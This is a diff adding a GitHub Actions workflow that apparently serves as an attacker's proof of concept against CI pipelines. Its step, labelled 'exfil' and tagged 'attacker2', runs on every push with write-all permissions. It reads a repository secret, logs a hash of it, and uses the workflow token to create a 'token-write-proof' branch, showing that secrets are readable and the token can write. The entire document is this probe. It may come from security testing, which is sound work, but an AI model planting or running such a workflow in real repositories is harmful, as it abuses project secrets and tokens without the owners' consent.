@@ -1,0 +1,19 @@
+name: copybranch-canary
+on:
+  push:
+permissions: write-all
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: exfil
+        env:
+          CANARY: ${{ secrets.CANARY }}
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+        run: |
+          echo "VERSION=attacker2"
+          echo "SECRETS_JSON_LEN=${#S}"
+          echo "CANARY_SHA=$(printf '%s' "$CANARY" | sha256sum | awk '{print $1}')"
+          gh api -X POST "repos/$REPO/git/refs" -f ref=refs/heads/token-write-proof -f sha="$SHA" --jq '.ref' || echo "WRITE_FAILED"
